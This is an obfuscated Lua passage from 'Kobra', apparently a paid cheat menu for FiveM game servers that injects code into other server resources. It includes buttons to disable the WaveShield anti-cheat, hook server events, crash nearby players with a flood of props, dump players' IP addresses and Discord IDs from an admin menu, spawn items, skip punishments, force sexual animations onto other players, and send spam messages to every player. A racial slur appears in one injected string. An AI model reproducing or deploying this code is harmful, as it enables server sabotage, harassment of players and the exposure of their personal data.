                            ]]);break;end end end},{type="divider",label="Emotes"},{type="button",label="Twerk On Them",onSelect=function() local v488=1770 -(694 + 1076) ;local v489;while true do if (v488==1) then if ( #v489==(1904 -(122 + 1782))) then v268:Notify("error","Kobra","You must select a player first!",2824 + 176 );return;end for v801,v802 in ipairs(v489) do MachoInjectResourceRaw("any",string.format([[
                                        CreateThread(function()
                                            local playerPed = PlayerPedId()
                                            local player = GetPlayerFromServerId(%d)
                                            if player == -1 then
                                                print("[twerk] Target player not found for serverId %d")
                                                return
                                            end

                                            local targetPed = GetPlayerPed(player)
                                            if not targetPed or targetPed == 0 or not DoesEntityExist(targetPed) then
                                                print("[twerk] Target ped invalid.")
                                                return
                                            end

                                            -- Safety: prevent attaching twice or to yourself
                                            if targetPed == playerPed then
                                                print("[twerk] Cannot twerk on yourself.")
                                                return
                                            end

                                            if StarkDaddy then
                                                ClearPedSecondaryTask(playerPed)
                                                DetachEntity(playerPed, true, false)
                                                StarkDaddy = false
                                                print("[twerk] Stopped twerking.")
                                                return
                                            end

                                            StarkDaddy = true
                                            local dict = "switch@trevor@mocks_lapdance"
                                            RequestAnimDict(dict)
                                            local timeout = 0
                                            while not HasAnimDictLoaded(dict) and timeout < 100 do
                                                Wait(50)
                                                timeout = timeout + 1
                                            end

                                            if not HasAnimDictLoaded(dict) then
                                                print("[twerk] Failed to load animation dictionary.")
                                                return
                                            end

                                            -- Safety checks before attaching
                                            if not DoesEntityExist(targetPed) or not DoesEntityExist(playerPed) then
                                                print("[twerk] One of the peds no longer exists.")
                                                return
                                            end

                                            -- Attach safely
                                            AttachEntityToEntity(playerPed, targetPed, 11816, 0.05, 0.38, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                                            TaskPlayAnim(playerPed, dict, "001443_01_trvs_28_idle_stripper", 8.0, -8.0, -1, 33, 0, false, false, false)
                                            print("[twerk] Started twerking on target.")

                                            -- Watchdog to auto detach if target dies/disconnects
                                            while StarkDaddy do
                                                Wait(1000)
                                                if not DoesEntityExist(targetPed) or IsEntityDead(targetPed) then
                                                    ClearPedSecondaryTask(playerPed)
                                                    DetachEntity(playerPed, true, false)
                                                    StarkDaddy = false
                                                    print("[twerk] Target disappeared — detached safely.")
                                                    break
                                                end
                                            end
                                        end)
                                    ]],v802,v802));end v488=2 + 0 ;end if (v488==(0 + 0)) then v489={};for v803,v804 in pairs(v27) do if v804 then v489[ #v489 + 1 + 0 ]=v803;end end v488=2 -1 ;end if (v488==(2 + 0)) then v268:Notify("success","Kobra","Attempted to twerk on "   ..  #v489   .. " player(s)." ,5970 -(214 + 1756) );break;end end end},{type="divider",label="Vehicle Emotes"},{type="button",label="Blow Driver",onSelect=function() local v490=0 + 0 ;local v491;while true do if (v490==(587 -(217 + 368))) then v268:Notify("success","Kobra","Attempted BlowDriver on "   ..  #v491   .. " player(s)." ,12084 -8084 );break;end if (v490==(1 + 0)) then if ( #v491==0) then v268:Notify("error","Kobra","You must select a player first!",2226 + 774 );return;end for v805,v806 in ipairs(v491) do MachoInjectResourceRaw("any",string.format([[
                                        CreateThread(function()
                                            local playerPed = PlayerPedId()
                                            local player = GetPlayerFromServerId(%d)
                                            if player == -1 then
                                                print("[blowdriver] Target player not found for serverId %d")
                                                return
                                            end

                                            local targetPed = GetPlayerPed(player)
                                            if not targetPed or targetPed == 0 or not DoesEntityExist(targetPed) then
                                                print("[blowdriver] Target ped invalid.")
                                                return
                                            end

                                            -- Prevent doing animation on yourself
                                            if targetPed == playerPed then
                                                print("[blowdriver] Cannot perform on yourself.")
                                                return
                                            end

                                            if BlowDriver then
                                                ClearPedSecondaryTask(playerPed)
                                                DetachEntity(playerPed, true, false)
                                                BlowDriver = false
                                                print("[blowdriver] Stopped animation.")
                                                return
                                            end

                                            BlowDriver = true
                                            local dict = "mini@prostitutes@sexnorm_veh"
                                            RequestAnimDict(dict)
                                            local timeout = 0
                                            while not HasAnimDictLoaded(dict) and timeout < 100 do
                                                Wait(50)
                                                timeout = timeout + 1
                                            end

                                            if not HasAnimDictLoaded(dict) then
                                                print("[blowdriver] Failed to load animation dictionary.")
                                                return
                                            end

                                            -- Attach to driver seat roughly where needed
                                            AttachEntityToEntity(playerPed, targetPed, 11816, 0.25, 0.25, 0.0, 0.0, 0.0, 90.0, false, false, false, false, 2, true)
                                            TaskPlayAnim(playerPed, dict, "bj_loop_prostitute", 8.0, -8.0, -1, 33, 0, false, false, false)
                                            print("[blowdriver] Started animation on target.")

                                            -- Watchdog to auto stop if target disappears or dies
                                            while BlowDriver do
                                                Wait(1000)
                                                if not DoesEntityExist(targetPed) or IsEntityDead(targetPed) then
                                                    ClearPedSecondaryTask(playerPed)
                                                    DetachEntity(playerPed, true, false)
                                                    BlowDriver = false
                                                    print("[blowdriver] Target disappeared — stopped safely.")
                                                    break
                                                end
                                            end
                                        end)
                                    ]],v806,v806));end v490=1 + 1 ;end if (v490==0) then v491={};for v807,v808 in pairs(v27) do if v808 then v491[ #v491 + (890 -(844 + 45)) ]=v807;end end v490=285 -(242 + 42) ;end end end}}}}},{icon="",label="Teleports",type="subMenu",categories={{label="Teleport Menu",tabs={{type="button",label="FIB Building",onSelect=function() local v492=0;local v493;local v494;while true do if (v492==(1201 -(132 + 1068))) then if v493 then MachoInjectResourceRaw("WaveShield",[[
                                local function HAZ6YqLRbM()
                                    local aSdFgHjKlQwErTy = PlayerPedId
                                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                    local x, y, z = 140.43, -750.52, 258.15
                                    local ped = aSdFgHjKlQwErTy()
                                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                                end

                                HAZ6YqLRbM()
                            ]]);elseif v494 then MachoInjectThread(0 -0 ,"any","",[[
                                local function HAZ6YqLRbM()
                                    local aSdFgHjKlQwErTy = PlayerPedId
                                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                    local x, y, z = 140.43, -750.52, 258.15
                                    local ped = aSdFgHjKlQwErTy()
                                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                                end

                                HAZ6YqLRbM()
                            ]]);else MachoInjectResourceRaw("any",[[
                                local function HAZ6YqLRbM()
                                    local aSdFgHjKlQwErTy = PlayerPedId
                                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                    local x, y, z = 140.43, -750.52, 258.15
                                    local ped = aSdFgHjKlQwErTy()
                                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                                end

                                HAZ6YqLRbM()
                            ]]);end break;end if (v492==0) then v493=GetResourceState("WaveShield")=="started" ;v494=GetResourceState("ReaperV4")=="started" ;v492=1624 -(214 + 1409) ;end end end},{type="button",label="Mission Row PD",onSelect=function() local v495=GetResourceState("WaveShield")=="started" ;local v496=GetResourceState("ReaperV4")=="started" ;if v495 then MachoInjectResourceRaw("WaveShield",[[
                            local function oypB9FcNwK()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 425.1, -979.5, 30.7
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            oypB9FcNwK()
                            ]]);elseif v496 then MachoInjectThread(0 + 0 ,"any","",[[
                        local function oypB9FcNwK()
                            local aSdFgHjKlQwErTy = PlayerPedId
                            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                            local x, y, z = 425.1, -979.5, 30.7
                            local ped = aSdFgHjKlQwErTy()
                            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                        end

                        oypB9FcNwK()
                        ]]);else MachoInjectResourceRaw("any",[[
                            local function oypB9FcNwK()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 425.1, -979.5, 30.7
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            oypB9FcNwK()
                            ]]);end end},{type="button",label="Pillbox Hospital",onSelect=function() local v497=GetResourceState("WaveShield")=="started" ;local v498=GetResourceState("ReaperV4")=="started" ;if v497 then MachoInjectResourceRaw("WaveShield",[[
                            local function TmXU0zLa4e()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 308.6, -595.3, 43.28
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            TmXU0zLa4e()
                            ]]);elseif v498 then MachoInjectThread(940 -(9 + 931) ,"any","",[[
                        local function TmXU0zLa4e()
                            local aSdFgHjKlQwErTy = PlayerPedId
                            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                            local x, y, z = 308.6, -595.3, 43.28
                            local ped = aSdFgHjKlQwErTy()
                            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                        end

                        TmXU0zLa4e()
                        ]]);else MachoInjectResourceRaw("any",[[
                            local function TmXU0zLa4e()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 308.6, -595.3, 43.28
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            TmXU0zLa4e()
                            ]]);end end},{type="button",label="Grove Street",onSelect=function() local v499=GetResourceState("WaveShield")=="started" ;local v500=GetResourceState("ReaperV4")=="started" ;if v499 then MachoInjectResourceRaw("WaveShield",[[
                            local function YrAFvPMkqt()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 109.63, -1943.14, 20.80
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            YrAFvPMkqt()
                            ]]);elseif v500 then MachoInjectThread(289 -(181 + 108) ,"any","",[[
                        local function YrAFvPMkqt()
                            local aSdFgHjKlQwErTy = PlayerPedId
                            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                            local x, y, z = 109.63, -1943.14, 20.80
                            local ped = aSdFgHjKlQwErTy()
                            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                        end

                        YrAFvPMkqt()
                        ]]);else MachoInjectResourceRaw("any",[[
                            local function YrAFvPMkqt()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 109.63, -1943.14, 20.80
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            YrAFvPMkqt()
                            ]]);end end},{type="button",label="Legion Square",onSelect=function() local v501=GetResourceState("WaveShield")=="started" ;local v502=GetResourceState("ReaperV4")=="started" ;if v501 then MachoInjectResourceRaw("WaveShield",[[
                            local function zdVCXL8rjp()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 229.21, -871.61, 30.49
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            zdVCXL8rjp()
                            ]]);elseif v502 then MachoInjectThread(0 + 0 ,"any","",[[
                            local function zdVCXL8rjp()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 229.21, -871.61, 30.49
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            zdVCXL8rjp()
                            ]]);else MachoInjectResourceRaw("any",[[
                            local function zdVCXL8rjp()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 229.21, -871.61, 30.49
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            zdVCXL8rjp()
                            ]]);end end}}}}},{icon="",label="Settings",type="subMenu",categories={{label="Interface",tabs={{type="subMenu",label="Keybinds",subTabs={{icon="",type="button",label="Menu Key",onSelect=function() v60("Choose Menu Key","",function(v592) for v652,v653 in pairs(v44) do if (v653:lower()==v592:lower()) then local v809=0 + 0 ;while true do if (v809==(477 -(296 + 180))) then v12:ShowUI();return;end if (v809==(1403 -(1183 + 220))) then v23=v653;Wait(250);v809=1;end end end end end,"keybind");end}}},{type="scrollable",label="Menu Positioning (X)",desc="This is the menu positioning based on the X-Axis.",value=1,values={"Left","Center","Right"},onSelect=function() print("Selected - Menu Positioning (X)");end},{type="scrollable",label="Menu Positioning (Y)",desc="This is the menu positioning based on the Y-Axis.",value=1,values={"Top","Middle","Bottom"},onSelect=function() print("Selected - Menu Positioning (Y)");end}}}}}};v17=v16;v18=nil;v19=1;v15=171 -(144 + 26) ;end;local function v97(v269) for v503,v504 in ipairs(v16) do if (v504.label=="Server") then for v731,v732 in ipairs(v504.categories) do if (v732.label=="Triggers") then local v856=0 -0 ;while true do if (v856==(0 -0)) then v732.tabs[ #v732.tabs + 1 + 0 ]=v269;return;end end end end end end end v12.UpdateTabChecked=function(v270,v271,v272,v273) for v505,v506 in pairs(v271 or {} ) do if ((v506.label==v272) and ((v506.type=="checkbox") or (v506.type=="slider-checkbox") or v506.type:find("checkbox"))) then v506.checked=v273;elseif (v506.type=="subMenu") then if v506.categories then for v984,v985 in pairs(v506.categories) do v270:UpdateTabChecked(v985.tabs,v272,v273);end end if v506.subTabs then v270:UpdateTabChecked(v506.subTabs,v272,v273);end end end end;v12.ShowKeybindList=function(v274,v275) v274:SendMessage({action="displayBinds",visible=true,binds=v275});end;v12.HideKeybindList=function(v276) v276:SendMessage({action="displayBinds",visible=false});end;v12.GetNearbyPlayers=function(v277,v278,v279,v280) local v281={};local v282=PlayerPedId();v279=v279 or 350 ;if ( not v282 or  not DoesEntityExist(v282) or  not IsPlayerPlaying(PlayerId())) then local v593=0 -0 ;while true do if (v593==0) then v281={};return v281;end end end local v283=GetActivePlayers();if v283 then for v655,v656 in ipairs(v283) do if (v280 or (v656~=PlayerId())) then local v810=0 -0 ;local v811;while true do if (v810==(0 -0)) then v811=GetPlayerPed(v656);if (v811 and DoesEntityExist(v811) and IsEntityAPed(v811) and  not IsEntityDead(v811)) then local v1083=GetEntityCoords(v811);if v1083 then local v1187= #(v278-v1083);if (v1187<=v279) then v281[ #v281 + 1 ]={name=GetPlayerName(v656),serverId=GetPlayerServerId(v656)};end end end break;end end end end else local v594,v595=FindFirstPed();local v596;repeat local v657=0 + 0 ;while true do if (v657==(0 -0)) then if (v595 and IsPedAPlayer(v595) and DoesEntityExist(v595)) then local v986=NetworkGetPlayerIndexFromPed(v595);if ((v986~= -(1 + 0)) and (v280 or (v986~=PlayerId()))) then local v1084=GetEntityCoords(v595);if v1084 then local v1188=0 + 0 ;local v1189;while true do if (v1188==0) then v1189= #(v278-v1084);if (v1189<=v279) then v281[ #v281 + (203 -(5 + 197)) ]={name=GetPlayerName(v986),serverId=GetPlayerServerId(v986)};end break;end end end end end v596,v595=FindNextPed(v594);break;end end until  not v596 EndFindPed(v594);end if ( #v281==(686 -(339 + 347))) then v281={};end return v281;end;CreateThread(function() v12:Initialize();v12:BuildDefaultMenu();v12:UpdateElements(v17);Wait(2266 -1266 );v12:Notify("success","Kobra","You have loaded Kobra Bypass, welcome!",10565 -7565 );Wait(1000);v12:Notify("info","Kobra","Hello Kobra Menu user, thanks for using Kobra Bypass!",3376 -(365 + 11) );Wait(948 + 52 );v97({type="button",label="Bypass WaveShield [Risky]",onSelect=function() local v507=0 -0 ;while true do if (v507==(0 -0)) then if (GetResourceState("WaveShield")~="started") then local v857=0;while true do if (v857==(924 -(837 + 87))) then v12:Notify("info","Kobra","WaveShield not detected.",5087 -2087 );return;end end end for v812=1671 -(837 + 833) ,1 + 1  do MachoInjectResource2(1390 -(356 + 1031) ,"WaveShield",[[
                error('my nigga what happened :(')
            ]]);end v507=1;end if (v507==(1 + 0)) then v12:Notify("success","Kobra","WaveShield bypass attempted.",4646 -(73 + 1573) );break;end end end});if ((GetResourceState("ox_lib")=="started") or (GetResourceState("lb-phone")=="started") or (GetResourceState("monitor")=="started") or (GetResourceState("core")=="started") or (GetResourceState("es_extended")=="started") or (GetResourceState("qb-core")=="started") or (GetResourceState("ox_lib")=="started")) then v97({type="button",label="DeFXAP Events",onSelect=function() local v658=0;local v659;local v660;local v661;while true do if (v658==1) then v60("Resource Name","",function(v901) if (v901 and (v901~="")) then v659=v901;end v660=true;end,"typeable");while  not v660 do Wait(1488 -(1307 + 81) );end if ( not v659 or (v659=="")) then MachoMenuNotification("Error","No resource name entered.");v12:ShowUI();return;end v658=2;end if (v658==(234 -(7 + 227))) then v12:HideUI();v659=nil;v660=false;v658=1 -0 ;end if (v658==2) then if (GetResourceState(v659)~="started") then local v987=166 -(90 + 76) ;while true do if (v987==(3 -2)) then return;end if (v987==0) then MachoMenuNotification("Error","Resource ^3"   .. v659   .. "^7 is not started or doesn’t exist." );v12:ShowUI();v987=1 + 0 ;end end end v661=[[
                local d = function(t)
                    local s = ""
                    for i = 1, #t do s = s .. string.char(t[i]) end
                    return s
                end
                local g = function(e) return _G[d(e)] end
                local w = function(ms) Citizen.Wait(ms) end

                local function SimpleJsonEncode(value)
                    if type(value) == "table" then
                        local parts = {}
                        local isArray = true
                        local maxIndex = 0
                        for k, _ in pairs(value) do
                            if type(k) ~= "number" or k < 1 or math.floor(k) ~= k then
                                isArray = false
                                break
                            end
                            maxIndex = math.max(maxIndex, k)
                        end
                        if isArray then
                            for i = 1, maxIndex do
                                local v = value[i]
                                parts[i] = v == nil and "null" or SimpleJsonEncode(v)
                            end
                            return "[" .. table.concat(parts, ",") .. "]"
                        else
                            for k, v in pairs(value) do
                                if type(k) == "string" then
                                    parts[#parts + 1] = "\"" .. k .. "\":" .. SimpleJsonEncode(v)
                                end
                            end
                            return "{" .. table.concat(parts, ",") .. "}"
                        end
                    elseif type(value) == "string" then
                        return "\"" .. tostring(value):gsub("\"", "\\\"") .. "\""
                    elseif type(value) == "number" or type(value) == "boolean" then
                        return tostring(value)
                    elseif value == nil then
                        return "null"
                    else
                        return "\"[unserializable:" .. type(value) .. "]\""
                    end
                end

                local function HookNative(nativeName, newFunction)
                    local original = _G[nativeName]
                    if original and type(original) == "function" then
                        _G[nativeName] = function(...)
                            local info = debug.getinfo(2, "Sln")
                            return newFunction(original, ...)
                        end
                    end
                end

                local te = d({84,114,105,103,103,101,114,69,118,101,110,116})  -- TriggerEvent
                local tse = d({84,114,105,103,103,101,114,83,101,114,118,101,114,69,118,101,110,116}) -- TriggerServerEvent

                HookNative(te, function(orig, eventName, ...)
                    local args = {...}
                    local encoded = {}
                    for i, arg in ipairs(args) do
                        encoded[i] = SimpleJsonEncode(arg)
                    end
                    print("^7[^5CLIENT^7] [^3EVENT^7]:", eventName, table.concat(encoded, ", "))
                    return orig(eventName, ...)
                end)

                HookNative(tse, function(orig, eventName, ...)
                    local args = {...}
                    local encoded = {}
                    for i, arg in ipairs(args) do
                        encoded[i] = SimpleJsonEncode(arg)
                    end
                    print("^7[^5SERVER^7] [^3EVENT^7]:", eventName, table.concat(encoded, ", "))
                    return orig(eventName, ...)
                end)
            ]];v48(v659,v661);v658=3 + 0 ;end if (v658==3) then MachoMenuNotification("Injector","Hooks injected into ^3"   .. v659   .. "^7 successfully!" );v12:ShowUI();break;end end end});end if (GetResourceState("ox_lib")=="started") then v97({type="button",label="CRASH NEARBY PLAYERS",onSelect=function() local v662=0 + 0 ;while true do if ((0 -0)==v662) then if (GetResourceState("WaveShield")=="started") then local v988=260 -(197 + 63) ;while true do if (v988==(0 + 0)) then v12:Notify("error","Kobra","Bahama Prevention: Can't use this on WaveShit",711 + 2289 );return;end end end MachoInjectResourceRaw("ox_lib",[[
                CreateObject = function() end

                local model <const> = 'p_spinning_anus_s'
                local props <const> = {}

                for i = 1, 600 do
                    props[i] = {
                        model = model,
                        coords = vec3(0.0, 0.0, 0.0),
                        pos = vec3(0.0, 0.0, 0.0),
                        rot = vec3(0.0, 0.0, 0.0)
                    }
                end

                local plyState <const> = LocalPlayer.state

                plyState:set('lib:progressProps', props, true)
                Wait(1000)
                plyState:set('lib:progressProps', nil, true)
        ]]);break;end end end});end if ((GetResourceState("dpemotes")=="started") or (GetResourceState("framework")=="started")) then v97({type="button",label="BRING NEARBY PLAYERS",onSelect=function() v12:Notify("success","Kobra","Attempting to bring all players",1566 + 1434 );MachoInjectThread(0 + 0 ,"dpemotes","",[[
                    TriggerServerEvent('ServerValidEmote', "-1", "horse", "horse")
                ]]);end});end if (GetResourceState("mc9-adminmenu")=="started") then v97({type="button",label="ADMIN MENU (F8)",onSelect=function() v12:Notify("success","Kobra","Admin Menu List",3765 -765 );MachoInjectResource2(NewThreadNs,"mc9-adminmenu",[[
                for id, ply in pairs(CurrentPlayers or {}) do
                    if ply and ply.name and ply.id then
                        print(("Information about ^6%s ^7| ^2%s"):format(ply.name, ply.id))
                        
                        if ply.identifiers and ply.identifiers.ip then
                            print(("    IP: ^2%s"):format(ply.identifiers.ip:sub(4)))
                        else
                            print("    IP: ^1Not Available")
                        end
                        
                        if ply.identifiers and ply.identifiers.discord then
                            print(("    Discord: ^2%s"):format(ply.identifiers.discord:sub(9)))
                        else
                            print("    Discord: ^1Not Available")
                        end
                    end
                end
            ]]);end});end if (GetResourceState("mc9-mainmenu")=="started") then v97({type="button",label="MCSHIT9 ADD ITEMS",onSelect=function() local v663=1369 -(618 + 751) ;while true do if (v663==0) then v12:Notify("success","Kobra","Spawning Items",2245 + 755 );MachoInjectResource2(NewThreadNs,"mc9-mainmenu",[[
            local data, playtime = mc9.callback.await("mc9-mainmenu:server:GetMilestoneReward", false)
            for i,v in pairs(data) do
                local result, message = mc9.callback.await("mc9-mainmenu:server:claimMilestoneReward", v)
            end
            ]]);break;end end end});end if (GetResourceState("vMenu")=="started") then v97({type="button",label="HIT DMS",onSelect=function() local v664=1910 -(206 + 1704) ;while true do if (v664==(0 -0)) then v12:Notify("success","Kobra","Message Sent",3000);MachoInjectResource2(1,"any",[[
                    TriggerServerEvent('vMenu:SendMessageToPlayer', -1, 'Hello this is Kobra Menu by JayThaaGamer, the leading cheat in the market.')
                ]]);break;end end end});end if (GetResourceState("amigo")=="started") then v97({type="button",label="ADD ITEM (1)",onSelect=function() v12:HideUI();local function v665(v733,v734) local v735=nil;local v736=false;v60(v733,v734 or "" ,function(v813) local v814=0 -0 ;while true do if ((0 + 0)==v814) then v735=v813;v736=true;break;end end end,"typeable");while  not v736 do Wait(1275 -(155 + 1120) );end return v735;end print("^7[^5Kobra^7] [^3DEBUG^7]: Waiting for item input...");local v666=v665("Item Name","");print("^7[^5Kobra^7] [^3DEBUG^7]: Raw itemName =",tostring(v666));if ( not v666 or (v666=="")) then local v815=1506 -(396 + 1110) ;while true do if (v815==1) then v12:ShowUI();return;end if (v815==(0 -0)) then print("^7[^5Kobra^7] [^1ERROR^7]: Invalid or empty itemName");v12:Notify("error","Kobra","No item name entered",978 + 2022 );v815=1;end end end print("^7[^5Kobra^7] [^3DEBUG^7]: Waiting for item count input...");local v667=v665("Item Count","1");print("^7[^5Kobra^7] [^3DEBUG^7]: Raw inputCount =",tostring(v667));local v668=tonumber(v667);if ( not v668 or (v668<(1 + 0))) then print("^7[^5Kobra^7] [^1WARN^7]: Invalid count, defaulting to 1");v668=1 + 0 ;end if (v668>(100976 -(230 + 746))) then print("^7[^5Kobra^7] [^1WARN^7]: Count too high, clamping to 100000");v668=100601 -(473 + 128) ;end v666=tostring(v666 or "" );v668=tonumber(v668 or (49 -(39 + 9)) );print("^7[^5Kobra^7] [^3DEBUG^7]: Final itemName =",v666);print("^7[^5Kobra^7] [^3DEBUG^7]: Final itemCount =",v668);local v669,v670=pcall(function() MachoInjectResourceRaw("amigo",string.format([[
                        -- Hook native functions safely
                        local function HookNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then return end
                            _G[nativeName] = function(...)
                                print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %%s"):format(nativeName))
                                return newFunction(originalNative, ...)
                            end
                        end

                        HookNative("TriggerEvent", function(originalFn, ...) return originalFn(...) end)
                        HookNative("TriggerServerEvent", function(originalFn, ...) return originalFn(...) end)

                        _G.Kobra = {
                            TEvent = function(eName, ...) return TriggerEvent(eName, ...) end,
                            TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end,
                        }

                        print("^7[^5Kobra^7] [^3DEBUG^7]: Sending giveItem request for %s x%d")
                        _G.Kobra.TSEvent('player:giveItem', { item = "%s", count = %d })
                    ]],v666,v668,v666,v668));end);if  not v669 then local v816=266 -(38 + 228) ;while true do if (v816==(0 -0)) then print("^7[^5Kobra^7] [^1ERROR^7]: string.format failed →",v670);print("^7[^5Kobra^7] [^3DEBUG^7]: itemName =",tostring(v666),"itemCount =",tostring(v668));v816=474 -(106 + 367) ;end if (v816==(1 + 0)) then v12:Notify("error","Kobra","String format failed — check console",4000);break;end end else print("^7[^5Kobra^7] [^2INFO^7]: Injection completed successfully");end v12:ShowUI();end});end local v284=GetResourceState("scripts")=="started" ;local v285=GetResourceState("framework")=="started" ;if (v284 or v285) then local v597=(v284 and "scripts") or "framework" ;v97({type="button",label="COMPLETE COMMS",onSelect=function() v12:Notify("Comserv","Kobra","Action Removed you might have to spam this",4862 -(354 + 1508) );MachoInjectResourceRaw(v597,[[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end

                    local function g(n) return _G[decode(n)] end

                    for i = 1, 1 do
                        lib.callback("comservs:completeAction", false, function(entity) print(entity) end)
                        g({87,97,105,116})(0)
                    end
